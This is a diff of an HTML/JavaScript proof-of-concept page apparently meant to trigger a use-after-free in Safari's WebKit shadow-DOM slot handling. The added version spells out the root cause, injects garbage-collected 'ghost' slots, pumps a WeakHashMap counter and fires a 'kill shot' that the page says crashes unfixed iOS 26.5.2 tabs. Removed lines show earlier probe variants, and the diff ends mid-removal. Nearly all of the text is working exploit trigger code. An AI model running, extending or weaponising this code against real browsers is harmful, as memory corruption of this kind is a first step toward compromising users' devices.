@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>ManualSlot UAF v100</title>
+<title>ManualSlot UAF v101</title>
 <style>
 * { margin:0; padding:0; box-sizing:border-box; }
 body { background:#0d0d0d; color:#00ff41; font-family:'Courier New',monospace; padding:16px; min-height:100vh; }
@@ -22,57 +22,55 @@ button.red   { border-color:#ff4141; color:#ff4141; }
 button.purple{ border-color:#ff41ff; color:#ff41ff; }
 button.copy-done { border-color:#00ff41; color:#00ff41; animation: pulse 0.6s ease 3; }
 @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
-#rig-area { position:fixed; top:0; left:0; width:200px; height:200px; overflow:visible; pointer-events:none; opacity:0.01; }
+/* rig must be VISIBLE for renderers to be created */
+#rig-area { position:fixed; bottom:0; right:0; width:10px; height:10px; overflow:hidden; pointer-events:none; opacity:0.02; }
 </style>
 </head>
 <body>
 
-<h2>ManualSlot UAF v100 · rdar://179729192 · re-entrant WeakHashMap modification</h2>
+<h2>ManualSlot UAF v101 · rdar://179729192 · commit 0bab5af95d · RenderTree teardown rehash</h2>
 
 <div class="warn">
 ▶ OPEN DIRECTLY IN SAFARI on device.<br>
 <br>
-v100 THEORY: The UAF requires re-entrant modification of m_manuallyAssignedSlotsForElementOrText.<br>
+v101 ROOT CAUSE (commit 0bab5af95da144b45e240675e21391b3f5518a30, 2026-08-13):<br>
 <br>
-v99 confirmed: direct slot.assign() shrink → NO UAF (shrink happens in isolation).<br>
-The bug fires when WebKit is ITERATING the map AND we modify it simultaneously.<br>
+  slotManualAssignmentDidChange() takes raw ptr from assignedNodesForSlot(slot1)<br>
+  → RenderTreeUpdater::tearDownRenderersAfterSlotChange → walks composed tree<br>
+  → hits sibling slot2 → ensure(slot2) on m_slots WeakHashMap<br>
+  → operation counter crosses threshold → removeDeadKeysIfNeeded() fires<br>
+  → sweeps ghost entries → REHASH → old bucket array FREED<br>
+  → back up stack: reads effectiveCurrent (stale raw ptr to freed memory) → UAF<br>
 <br>
-ITERATION happens inside resolveSlotsAfterSlotMutation() — called during LAYOUT.<br>
-MODIFICATION happens via slot.assign() from JS.<br>
+REQUIREMENTS:<br>
+  1. Two slots in SAME shadow root (slot2 must be a sibling in composed-tree walk)<br>
+  2. Ghost entries = temp slots GC'd from m_slots WeakHashMap (dead WeakPtrs)<br>
+  3. Renderers on host (must be in visible layout — getBCR forces it)<br>
+  4. Pump m_slots operation counter to just below cleanup threshold<br>
+  5. Kill shot: slot1.assign(different_set) → triggers slotManualAssignmentDidChange<br>
 <br>
-Key window: slotchange event + MutationObserver can fire from inside layout pass.<br>
-If they call slot.assign() while resolveSlotsAfterSlotMutation() is mid-iteration → UAF.<br>
-<br>
-NEW PATHS:<br>
-  E: slotchange → getBoundingClientRect() → slot.assign() [force layout re-entry]<br>
-  F: MutationObserver on shadow root → slot.assign() from observer callback<br>
-  G: ResizeObserver on shadow host → slot.assign() during resize callback<br>
-  H: IntersectionObserver → slot.assign() when host enters viewport<br>
-  I: Nested shadow roots — outer host forces inner map conflict<br>
-  J: CSS transition/animation end → slot.assign() during paint<br>
-  K: requestAnimationFrame tight loop — race layout + assign<br>
+NOTE: On unfixed iOS 26.5.2, this CRASHES the tab (SIGSEGV/SIGBUS).<br>
+Tab reload = success. Secondary: slotchange count mismatch.<br>
 </div>
 
 <div id="ctrl">
-  <button id="bE" onclick="runPathE()" class="red">PATH-E: slotchange+layout</button>
-  <button id="bF" onclick="runPathF()" class="red">PATH-F: MutationObserver</button>
-  <button id="bG" onclick="runPathG()" class="red">PATH-G: ResizeObserver</button>
-  <button id="bH" onclick="runPathH()" class="red">PATH-H: IntersectionObs</button>
-  <button id="bI" onclick="runPathI()" class="red">PATH-I: nested shadows</button>
-  <button id="bJ" onclick="runPathJ()" class="red">PATH-J: RAF tight loop</button>
-  <button id="bL" onclick="runLoop()"  class="red">LOOP ×500</button>
+  <button id="bA" onclick="runPathA()">PATH-A: baseline</button>
+  <button id="bB" onclick="runPathB()" class="red">PATH-B: ghosts+kill</button>
+  <button id="bC" onclick="runPathC()" class="red">PATH-C: pump sweep</button>
+  <button id="bD" onclick="runPathD()" class="red">PATH-D: GC-gated</button>
+  <button id="bE" onclick="runPathE()" class="red">PATH-E: stress×200</button>
   <button id="bAll" onclick="runAll()" class="purple">RUN ALL</button>
   <button id="bCopy" onclick="copyLog()">COPY LOG</button>
   <button onclick="L.innerHTML=''">CLR</button>
 </div>
 <div id="log"></div>
-<div id="rig-area"></div>
+<div id="rig-area" id="rig-area"></div>
 
 <script>
 'use strict';
-const RIG  = document.querySelector('#rig-area');
+const RIG  = document.getElementById('rig-area');
 const L    = document.getElementById('log');
-const BTNS = ['bE','bF','bG','bH','bI','bJ','bL','bAll'];
+const BTNS = ['bA','bB','bC','bD','bE','bAll'];
 let uafTotal = 0;
 let _inRunAll = false;
 
@@ -80,7 +78,13 @@ function log(msg, cls){
   const s=document.createElement('span');
   if(cls) s.className=cls;
   s.textContent=msg+'\n';
-  L.appendChild(s); L.scrollTop=L.scrollHeight;
+  L.appendChild(s);
+  L.scrollTop=L.scrollHeight;
+}
+function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
+function noteUAF(lbl){
+  uafTotal++;
+  log(`  !! UAF SIGNAL [${lbl}]`,'hit');
 }
 function copyLog(){
   const t=document.createElement('textarea');
@@ -91,599 +95,437 @@ function copyLog(){
   b.textContent='COPIED ✓'; b.classList.add('copy-done');
   setTimeout(()=>{ b.textContent='COPY LOG'; b.classList.remove('copy-done'); },2000);
 }
-function dis(v){ BTNS.forEach(id=>{ const b=document.getElementById(id); if(b) b.disabled=v; }); }
-function noteUAF(tag){ uafTotal++; log(`  !!UAF-SIGNAL!! [${tag}] total=${uafTotal}`, 'hit'); }
-function delay(ms){ return new Promise(r=>setTimeout(r,ms)); }
-function tick(){ return new Promise(r=>setTimeout(r,0)); }
+function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }
+function nextTick(){ return new Promise(r=>setTimeout(r,0)); }
 
-// Make manual shadow host — N children, spread assign
-function makeRig(pfx, N){
+/* ──────────────────────────────────────────────
+   RIG BUILDER
+   host is VISIBLE in the DOM so renderers exist.
+   Two real slots: slotX and slotY.
+   childA assigned to slotX, childB to slotY.
+   ────────────────────────────────────────────── */
+function buildRig(){
   const host = document.createElement('div');
-  host.style.cssText='display:block;width:80px;height:20px;contain:layout;';
-  let sr;
-  try{ sr=host.attachShadow({mode:'open',slotAssignment:'manual'}); }
-  catch(e){ return null; }
-  const slot=document.createElement('slot');
-  sr.appendChild(slot);
-  const ch=[];
-  for(let i=0;i<N;i++){
-    const n=document.createElement('span');
-    n.textContent=`${pfx}${i}`;
-    host.appendChild(n);
-    ch.push(n);
-  }
+  host.style.cssText = 'display:block;width:8px;height:8px';
   RIG.appendChild(host);
+
+  const sr = host.attachShadow({ mode:'open', slotAssignment:'manual' });
+
+  const slotX = document.createElement('slot'); slotX.name='x';
+  const slotY = document.createElement('slot'); slotY.name='y';
+  sr.appendChild(slotX);
+  sr.appendChild(slotY);
+
+  const childA = document.createElement('span'); childA.textContent='A';
+  const childB = document.createElement('span'); childB.textContent='B';
+  host.appendChild(childA);
+  host.appendChild(childB);
+
+  // Initial assignment: X→[A], Y→[B]
+  slotX.assign(childA);
+  slotY.assign(childB);
+
+  // Force layout → create renderers (CRITICAL for teardown path)
   void host.getBoundingClientRect();
-  return {host,sr,slot,ch};
+
+  return { host, sr, slotX, slotY, childA, childB };
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH E: slotchange handler forces layout THEN re-assigns (re-entrant layout)
-//
-// Theory: slot.assign() → resolveSlotsAfterSlotMutation → slotchange event
-// In slotchange: call getBoundingClientRect() to force SYNCHRONOUS layout
-// Then call slot.assign() again inside that handler
-// If slotchange is synchronous (WebKit sometimes fires it sync during resolution),
-// we are calling slot.assign() while resolveSlotsAfterSlotMutation is on the stack
-// This is the re-entrant modification path.
-// ─────────────────────────────────────────────────────────────────────────────
-async function probePathE(label, N, keepOnShrink){
-  const rig = makeRig(label, N+4);
-  if(!rig) return {sig:'NO-RIG',hit:false};
+function teardownRig(r){
+  try { r.host.remove(); } catch(_){}
+}
 
-  let threw=false, threwMsg='', scCount=0, innerThrew=false;
-  const sigs=[];
+/* Create N ghost slot entries in sr's m_slots WeakHashMap.
+   Each tmp slot is created, touched (ensure() via assignedNodes),
+   then removed from the shadow root without holding a JS ref.
+   After GC, their WeakPtrs in m_slots become null = dead entries.
+*/
+function injectGhosts(sr, count){
+  for(let i=0; i<count; i++){
+    const tmp = document.createElement('slot');
+    tmp.name = `ghost-${i}`;
+    sr.appendChild(tmp);
+    // Touch m_slots for this slot (ensure() call = dead entry after GC)
+    void tmp.assignedNodes();
+    // Remove from shadow root — JS var goes out of scope at loop end
+    sr.removeChild(tmp);
+    // No reference held → GC candidate
+  }
+}
 
-  rig.slot.addEventListener('slotchange', function onSC(){
-    scCount++;
-    if(scCount===1){
-      // Force SYNCHRONOUS layout from inside slotchange
-      // This re-enters WebKit's layout/rendering pipeline
-      try{ void rig.host.getBoundingClientRect(); } catch(_){}
+/* Pump m_slots operation counter.
+   Each assignedNodes() call on slotX or slotY does a find() on m_slots.
+   We need counter to reach tableCapacity just BEFORE the kill shot,
+   so the next ensure() during teardown crosses the threshold.
+*/
+function pumpCounter(slotX, slotY, iterations){
+  for(let i=0; i<iterations; i++){
+    void slotX.assignedNodes();
+    void slotY.assignedNodes();
+  }
+}
 
-      // Now call slot.assign() — modifies m_manuallyAssignedSlotsForElementOrText
-      // IF resolveSlotsAfterSlotMutation is still on the C++ call stack → UAF
-      try{
-        if(keepOnShrink===0) rig.slot.assign();
-        else rig.slot.assign(...rig.ch.slice(0, keepOnShrink));
-      } catch(e){
-        innerThrew=true;
-        noteUAF(`${label}-inner-assign-threw:${e.message.substring(0,40)}`);
-      }
+/* Encourage GC: allocate large ArrayBuffers then release them */
+function pressureGC(){
+  const bufs = [];
+  for(let i=0; i<40; i++) bufs.push(new ArrayBuffer(512*1024));
+  // let them be collected
+}
+
+/* ──────────────────────────────────────────────
+   KILL SHOT
+   Reassign slotX to childB (previously assigned to slotY).
+   This triggers slotManualAssignmentDidChange for slotX,
+   which calls tearDownRenderersAfterSlotChange → composed-tree walk
+   → hits slotY → ensure(slotY) on m_slots
+   → if counter at threshold → removeDeadKeysIfNeeded → REHASH
+   → effectiveCurrent (raw ptr to slotX's old entry) now points to freed memory
+   → UAF on read.
+   ────────────────────────────────────────────── */
+function killShot(r){
+  let sc_x = 0, sc_y = 0;
+  let scXnodes=[], scYnodes=[];
+
+  r.slotX.addEventListener('slotchange', ()=>{
+    sc_x++;
+    scXnodes = Array.from(r.slotX.assignedElements());
+  });
+  r.slotY.addEventListener('slotchange', ()=>{
+    sc_y++;
+    scYnodes = Array.from(r.slotY.assignedElements());
+  });
+
+  // Kill: move childB from slotY to slotX
+  // Expected: slotX=[childB], slotY=[], sc_x=1, sc_y=1
+  r.slotX.assign(r.childB);
+
+  // Force layout to trigger teardown immediately
+  void r.host.getBoundingClientRect();
+
+  return { sc_x, sc_y, scXnodes, scYnodes };
+}
+
+async function killShotAsync(r){
+  const sync = killShot(r);
+  await nextTick(); // let slotchange microtasks fire
+  const ax = r.slotX.assignedElements();
+  const ay = r.slotY.assignedElements();
+  return {
+    ...sync,
+    ax: ax.length, axNode: ax[0],
+    ay: ay.length,
+  };
+}
+
+/* Signal detection:
+   Expected after slotX.assign(childB):
+     slotX = [childB] → ax=1, axNode===childB, sc_x=1
+     slotY = []       → ay=0, sc_y=1 (childB was stolen)
+
+   Any deviation = state corruption signal.
+   (On a crash path we won't reach detection at all — tab dies.)
+*/
+function detectSignal(label, res, r){
+  const expAxLen  = 1;
+  const expAxNode = r.childB;
+  const expAyLen  = 0;
+
+  const badLen  = res.ax !== expAxLen;
+  const badNode = res.ax > 0 && res.axNode !== expAxNode;
+  const badAy   = res.ay !== expAyLen;
+  const badScX  = res.sc_x !== 1;
+  const badScY  = res.sc_y !== 1;  // childB stolen from Y → Y fires too
+
+  const bad = badLen || badNode || badAy || badScX || badScY;
+  return { bad, badLen, badNode, badAy, badScX, badScY };
+}
+
+/* ══════════════════════════════════════════════
+   PATH-A: Baseline sanity — no ghosts, no pump
+   Should always be clean. Verifies detection logic.
+   ══════════════════════════════════════════════ */
+async function runPathA(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('','');
+  log('━━━━━━━━━━━━ PATH-A: baseline (no ghosts, no pump) ━━━━━━━━━━━━','hi');
+  log('╔══════════════════════════════════════════════════════════════╗','dim');
+  log('║  PATH-A: two-slot rig, no ghost entries, no pump            ║','dim');
+  log('╚══════════════════════════════════════════════════════════════╝','dim');
+  log('','');
+
+  const RUNS = 5;
+  let sigs = 0;
+  for(let i=0; i<RUNS; i++){
+    const r = buildRig();
+    const res = await killShotAsync(r);
+    const det = detectSignal('A',res,r);
+    const str = `  [A${i+1}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    if(det.bad){
+      sigs++;
+      noteUAF(`A-baseline-corrupt`);
+      log(str+' ← SIGNAL','bad');
+    } else {
+      log(str,'ok');
     }
-  });
-
-  // Fill to grow WeakHashMap
-  try{ rig.slot.assign(...rig.ch.slice(0, N)); }
-  catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-fill-threw`); }
-
-  void rig.host.getBoundingClientRect();
-  sigs.push(`sc=${scCount}`);
-
-  let preLen=-1;
-  try{ preLen=rig.slot.assignedElements().length; }catch(e){ preLen=-999; }
-  sigs.push(`pre=${preLen}`);
-
-  return new Promise(resolve=>{
-    setTimeout(()=>{
-      let post=-1;
-      try{ post=rig.slot.assignedElements().length; }
-      catch(e){ post=-999; threw=true; noteUAF(`${label}-post-threw`); }
-      sigs.push(`post=${post}`);
-      if(threw) sigs.push(`THREW:${threwMsg.substring(0,40)}`);
-      if(innerThrew) sigs.push('INNER-THREW');
-      try{ RIG.removeChild(rig.host); }catch(_){}
-      const hit=threw||post===-999||innerThrew;
-      const sig=`[${label}] N=${N}→keep=${keepOnShrink} sc=${scCount} | ${sigs.join(' | ')}`;
-      resolve({sig,hit,threw,post});
-    },100);
-  });
+    teardownRig(r);
+  }
+  log(`\n  ${sigs} signals (expected 0)`, sigs===0?'ok':'bad');
+  if(!_inRunAll) dis(false);
 }
 
+/* ══════════════════════════════════════════════
+   PATH-B: Ghost entries + kill, no pump sweep
+   Fixed ghost counts: 16, 32, 64
+   No pump (counter at 0 before kill)
+   ══════════════════════════════════════════════ */
+async function runPathB(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('','');
+  log('━━━━━━━━━━━━ PATH-B: ghosts only (no pump) ━━━━━━━━━━━━','hi');
+  log('╔══════════════════════════════════════════════════════════════╗','dim');
+  log('║  PATH-B: inject ghost entries, GC, kill shot — no pump      ║','dim');
+  log('╚══════════════════════════════════════════════════════════════╝','dim');
+  log('','');
+
+  const ghostCounts = [8, 16, 32, 64, 128];
+  let sigs = 0;
+
+  for(const ghosts of ghostCounts){
+    const r = buildRig();
+    injectGhosts(r.sr, ghosts);
+    pressureGC();
+    await nextTick(); // yield for GC
+    pressureGC();
+    await nextTick();
+
+    const res = await killShotAsync(r);
+    const det = detectSignal('B',res,r);
+    const str = `  [B-g${ghosts}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    if(det.bad){
+      sigs++;
+      noteUAF(`B-g${ghosts}`);
+      log(str+' ← SIGNAL','bad');
+    } else {
+      log(str,'ok');
+    }
+    teardownRig(r);
+    await nextTick();
+  }
+  log(`\n  ${sigs} signals`, sigs>0?'bad':'ok');
+  if(!_inRunAll) dis(false);
+}
+
+/* ══════════════════════════════════════════════
+   PATH-C: Ghost entries + pump sweep (main path)
+   Sweep pump iterations 0..120 in steps of 5.
+   GHOSTS=32 → m_slots table cap ~64.
+   At pump=32: ~64 ops → threshold crossing.
+   Tries multiple ghost counts × pump values.
+   ══════════════════════════════════════════════ */
+async function runPathC(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('','');
+  log('━━━━━━━━━━━━ PATH-C: pump sweep (MAIN PATH) ━━━━━━━━━━━━','hi');
+  log('╔══════════════════════════════════════════════════════════════╗','dim');
+  log('║  PATH-C: ghosts=32, pump=0..120 in steps of 4              ║','dim');
+  log('╚══════════════════════════════════════════════════════════════╝','dim');
+  log('','');
+  log('  Sweeping pump counts to find cleanup threshold...','inf');
+
+  const GHOSTS = 32;
+  const PUMP_MAX = 120;
+  const PUMP_STEP = 4;
+  let sigs = 0;
+  let found = false;
+
+  for(let pump=0; pump<=PUMP_MAX && !found; pump+=PUMP_STEP){
+    const r = buildRig();
+    injectGhosts(r.sr, GHOSTS);
+    pressureGC();
+    await nextTick();
+    pressureGC();
+    await nextTick();
+
+    pumpCounter(r.slotX, r.slotY, pump);
+
+    const res = await killShotAsync(r);
+    const det = detectSignal('C',res,r);
+    const str = `  [C-p${pump}] ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    if(det.bad){
+      sigs++;
+      found = true;
+      noteUAF(`C-pump${pump}`);
+      log(str+' ← SIGNAL  badLen='+det.badLen+' badAy='+det.badAy+' badScX='+det.badScX+' badScY='+det.badScY,'bad');
+    } else {
+      log(str,'dim');
+    }
+    teardownRig(r);
+
+    if(pump % 20 === 0) await nextTick();
+  }
+  log(`\n  ${sigs} signals (sweep 0..${PUMP_MAX} pump)`, sigs>0?'bad':'ok');
+  if(!_inRunAll) dis(false);
+}
+
+/* ══════════════════════════════════════════════
+   PATH-D: FinalizationRegistry-gated kill
+   Uses FR to confirm temp slots are actually GC'd
+   before running pump + kill shot.
+   Most reliable reproduction.
+   ══════════════════════════════════════════════ */
+async function runPathD(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('','');
+  log('━━━━━━━━━━━━ PATH-D: GC-gated kill ━━━━━━━━━━━━','hi');
+  log('╔══════════════════════════════════════════════════════════════╗','dim');
+  log('║  PATH-D: FinalizationRegistry confirms GC before kill       ║','dim');
+  log('╚══════════════════════════════════════════════════════════════╝','dim');
+  log('','');
+
+  const pumpCounts = [20, 30, 40, 50, 60, 70, 80, 100];
+  let sigs = 0;
+
+  for(const pump of pumpCounts){
+    // Check FinalizationRegistry availability
+    if(typeof FinalizationRegistry === 'undefined'){
+      log('  FinalizationRegistry not available — skipping PATH-D','inf');
+      break;
+    }
+
+    const r = buildRig();
+    const GHOSTS = 32;
+
+    // Register tokens so we know when GC has run
+    let gcCount = 0;
+    const fr = new FinalizationRegistry(()=>{ gcCount++; });
+    const tokens = [];
+
+    for(let i=0; i<GHOSTS; i++){
+      const tmp = document.createElement('slot');
+      tmp.name = `ghost-d-${i}`;
+      r.sr.appendChild(tmp);
+      void tmp.assignedNodes();
+      r.sr.removeChild(tmp);
+
+      // Register a separate object as the GC token
+      const token = { i };
+      fr.register(tmp, i, token);
+      tokens.push(token);
+      // tmp goes out of scope here → GC candidate
+    }
+
+    // Pressure GC in a loop until at least half the ghosts are collected
+    let waited = 0;
+    while(gcCount < Math.floor(GHOSTS/2) && waited < 20){
+      pressureGC();
+      await nextTick();
+      waited++;
+    }
+
+    const gcStr = `gcCount=${gcCount}/${GHOSTS}`;
+    log(`  [D-p${pump}] ${gcStr} waited=${waited}ms`,'inf');
+
+    if(gcCount === 0){
+      log(`    GC didn't fire — skipping kill shot for this config`,'dim');
+      teardownRig(r);
+      continue;
+    }
+
+    pumpCounter(r.slotX, r.slotY, pump);
+
+    const res = await killShotAsync(r);
+    const det = detectSignal('D',res,r);
+    const str = `  [D-p${pump}] ${gcStr} ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y}`;
+    if(det.bad){
+      sigs++;
+      noteUAF(`D-pump${pump}-${gcStr}`);
+      log(str+' ← SIGNAL','bad');
+    } else {
+      log(str,'ok');
+    }
+    teardownRig(r);
+    await nextTick();
+  }
+  log(`\n  ${sigs} signals`, sigs>0?'bad':'ok');
+  if(!_inRunAll) dis(false);
+}
+
+/* ══════════════════════════════════════════════
+   PATH-E: Stress ×200
+   Random pump counts 0..100, ghosts 16..64
+   Rapid fire to hit the window probabilistically
+   ══════════════════════════════════════════════ */
 async function runPathE(){
   if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-E: slotchange → force layout → re-assign              ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-  log('  slotchange fires → getBCR() → slot.assign() → re-entrant modification','inf');
-  log('');
+  log('','');
+  log('━━━━━━━━━━━━ PATH-E: stress ×200 ━━━━━━━━━━━━','hi');
+  log('╔══════════════════════════════════════════════════════════════╗','dim');
+  log('║  PATH-E: 200 random configurations (ghosts×pump)           ║','dim');
+  log('╚══════════════════════════════════════════════════════════════╝','dim');
+  log('','');
 
-  const cfgs=[
-    {label:'E09-k0', N:9,  keep:0},
-    {label:'E09-k1', N:9,  keep:1},
-    {label:'E17-k0', N:17, keep:0},
-    {label:'E17-k3', N:17, keep:3},
-    {label:'E33-k0', N:33, keep:0},
-    {label:'E33-k7', N:33, keep:7},
-    {label:'E65-k0', N:65, keep:0},
-    {label:'E65-k15',N:65, keep:15},
-  ];
+  const RUNS = 200;
+  let sigs = 0;
+  let ok = 0;
 
-  const sums=[];
-  for(const c of cfgs){
-    const r=await probePathE(c.label,c.N,c.keep);
-    log(`  ${r.sig}`,r.hit?'hit':'ok');
-    sums.push(r);
-    await delay(30);
-  }
-  log('');
-  const hits=sums.filter(r=>r.hit);
-  log(hits.length?`  !! ${hits.length} signals on PATH-E`:'  0 signals',hits.length?'hit':'inf');
-  dis(false);
-}
+  for(let i=0; i<RUNS; i++){
+    const ghosts = 8 + Math.floor(Math.random()*120);  // 8..127
+    const pump   = Math.floor(Math.random()*100);       // 0..99
 
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH F: MutationObserver on shadowRoot → slot.assign() inside callback
-//
-// MutationObserver fires after DOM mutations — if it fires during layout
-// (or if we force layout inside callback), and calls slot.assign()
-// which modifies the WeakHashMap → potential UAF.
-// ─────────────────────────────────────────────────────────────────────────────
-async function probePathF(label, N){
-  const rig=makeRig(label, N+4);
-  if(!rig) return {sig:'NO-RIG',hit:false};
+    const r = buildRig();
+    injectGhosts(r.sr, ghosts);
+    pressureGC();
+    await nextTick();
+    pumpCounter(r.slotX, r.slotY, pump);
 
-  let threw=false, obsCount=0, obsThrew=false;
+    const res = await killShotAsync(r);
+    const det = detectSignal('E',res,r);
 
-  // Observe the host for child mutations
-  const mo=new MutationObserver(()=>{
-    obsCount++;
-    if(obsCount===1){
-      void rig.host.getBoundingClientRect();
-      // Modify WeakHashMap from observer callback
-      try{
-        rig.slot.assign();  // shrink: remove all
-      }catch(e){
-        obsThrew=true;
-        noteUAF(`${label}-obs-assign-threw:${e.message.substring(0,40)}`);
-      }
+    if(det.bad){
+      sigs++;
+      noteUAF(`E-g${ghosts}-p${pump}`);
+      log(`  [E${i+1}] g=${ghosts} p=${pump} ax=${res.ax} ay=${res.ay} sc_x=${res.sc_x} sc_y=${res.sc_y} ← SIGNAL`,'bad');
+    } else {
+      ok++;
     }
-  });
-  mo.observe(rig.host,{childList:true,subtree:true,attributes:true});
+    teardownRig(r);
 
-  // Fill map
-  try{ rig.slot.assign(...rig.ch.slice(0,N)); }
-  catch(e){ threw=true; noteUAF(`${label}-fill-threw`); }
-  void rig.host.getBoundingClientRect();
-
-  // Trigger MutationObserver by mutating a child attribute
-  rig.ch[0].setAttribute('data-x','1');
-  await tick();  // observer fires as microtask after this
-
-  mo.disconnect();
-
-  return new Promise(resolve=>{
-    setTimeout(()=>{
-      let post=-1;
-      try{ post=rig.slot.assignedElements().length; }
-      catch(e){ post=-999; threw=true; noteUAF(`${label}-post-threw`); }
-      try{ RIG.removeChild(rig.host); }catch(_){}
-      const hit=threw||post===-999||obsThrew;
-      const sig=`[${label}] N=${N} obsCount=${obsCount} | post=${post} threw=${threw} obsThrew=${obsThrew}`;
-      resolve({sig,hit});
-    },100);
-  });
-}
-
-async function runPathF(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-F: MutationObserver → slot.assign() from callback     ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  const cfgs=[9,17,33,65,129];
-  const sums=[];
-  for(const N of cfgs){
-    const r=await probePathF(`F${N}`,N);
-    log(`  ${r.sig}`,r.hit?'hit':'ok');
-    sums.push(r);
-    await delay(30);
-  }
-  log('');
-  const hits=sums.filter(r=>r.hit);
-  log(hits.length?`  !! ${hits.length} signals on PATH-F`:'  0 signals',hits.length?'hit':'inf');
-  dis(false);
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH G: ResizeObserver → slot.assign() during resize/layout callback
-//
-// ResizeObserver fires after layout. If it calls slot.assign() which triggers
-// another layout pass (resolveSlotsAfterSlotMutation), and if that second
-// pass is called while the first is still unwinding → re-entrancy → UAF.
-// ─────────────────────────────────────────────────────────────────────────────
-async function probePathG(label, N){
-  const rig=makeRig(label, N+4);
-  if(!rig) return {sig:'NO-RIG',hit:false};
-
-  let threw=false, roCount=0, roThrew=false;
-  let resolved=false;
-
-  return new Promise(resolve=>{
-    const ro=new ResizeObserver(entries=>{
-      if(resolved) return;
-      roCount++;
-      if(roCount<=2){
-        try{
-          // Shrink: remove all assignments → WeakHashMap shrinks
-          rig.slot.assign();
-          // Then re-fill to trigger grow again
-          if(N>0) rig.slot.assign(...rig.ch.slice(0,Math.floor(N/2)));
-        }catch(e){
-          roThrew=true;
-          noteUAF(`${label}-ro-assign-threw:${e.message.substring(0,40)}`);
-        }
-      }
-      if(roCount>=3){
-        ro.disconnect();
-        resolved=true;
-        let post=-1;
-        try{ post=rig.slot.assignedElements().length; }
-        catch(e){ post=-999; threw=true; noteUAF(`${label}-post-threw`); }
-        try{ RIG.removeChild(rig.host); }catch(_){}
-        const hit=threw||post===-999||roThrew;
-        resolve({sig:`[${label}] N=${N} roCount=${roCount} post=${post} threw=${threw} roThrew=${roThrew}`,hit});
-      }
-    });
-
-    // Fill map first
-    try{ rig.slot.assign(...rig.ch.slice(0,N)); }
-    catch(e){ threw=true; noteUAF(`${label}-fill-threw`); }
-
-    ro.observe(rig.host);
-    // Trigger resize
-    rig.host.style.width='120px';
-    void rig.host.getBoundingClientRect();
-    rig.host.style.width='80px';
-
-    // Timeout fallback
-    setTimeout(()=>{
-      if(!resolved){
-        ro.disconnect(); resolved=true;
-        try{ RIG.removeChild(rig.host); }catch(_){}
-        resolve({sig:`[${label}] N=${N} roCount=${roCount} TIMEOUT`,hit:false});
-      }
-    },500);
-  });
-}
-
-async function runPathG(){
-  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
-  log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  PATH-G: ResizeObserver → slot.assign() during layout       ║','hi');
-  log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('');
-
-  const cfgs=[9,17,33,65];
-  const sums=[];
-  for(const N of cfgs){
-    const r=await probePathG(`G${N}`,N);
-    log(`  ${r.sig}`,r.hit?'hit':'ok');
-    sums.push(r);
-    await delay(30);
-  }
-  log('');
-  const hits=sums.filter(r=>r.hit);
-  log(hits.length?`  !! ${hits.length} signals on PATH-G`:'  0 signals',hits.length?'hit':'inf');
-  dis(false);
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-// PATH H: IntersectionObserver → slot.assign() when host intersects
-// ─────────────────────────────────────────────────────────────────────────────
-async function probePathH(label, N){
-  // Need host in main viewport, not fixed hidden rig
-  const host=document.createElement('div');
-  host.style.cssText='display:block;width:80px;height:20px;contain:layout;';
-  let sr;
-  try{ sr=host.attachShadow({mode:'open',slotAssignment:'manual'}); }
-  catch(e){ return {sig:'NO-SR',hit:false}; }
-  const slot=document.createElement('slot');
-  sr.appendChild(slot);
-  const ch=[];
-  for(let i=0;i<N+4;i++){
-    const n=document.createElement('span');
-    n.textContent=`h${i}`;
-    host.appendChild(n);
-    ch.push(n);
-  }
-  document.body.appendChild(host);
-
-  let threw=false, ioCount=0, ioThrew=false, resolved=false;
-
-  return new Promise(resolve=>{
-    const io=new IntersectionObserver(entries=>{
-      if(resolved||!entries[0].isIntersecting) return;
-      ioCount++;
-      if(ioCount===1){
-        try{
-          // Fill then shrink inside intersection callback
-          slot.assign(...ch.slice(0,N));
-          void host.getBoundingClientRect();
-          slot.assign();  // shrink
-        }catch(e){
-          ioThrew=true;
-          noteUAF(`${label}-io-assign-threw:${e.message.substring(0,40)}`);
-        }
-        io.disconnect();
-        resolved=true;
-        setTimeout(()=>{
-          let post=-1;
-          try{ post=slot.assignedElements().length; }
-          catch(e){ post=-999; noteUAF(`${label}-post-threw`); }
-          try{ document.body.removeChild(host); }catch(_){}
-          const hit=threw||post===-999||ioThrew;
-          resolve({sig:`[${label}] N=${N} ioCount=${ioCount} post=${post} ioThrew=${ioThrew}`,hit});
-        },80);
-      }
-    },{threshold:0});
-
-    io.observe(host);
-    setTimeout(()=>{
-      if(!resolved){
-        io.disconnect(); resolved=true;
-        try{ document.body.removeChild(host); }catch(_){}
-        resolve({sig:`[${label}] N=${N} TIMEOUT (not intersecting)`,hit:false});
-      }
-    },500);
-  });
-}
-
-async function runPathH(){
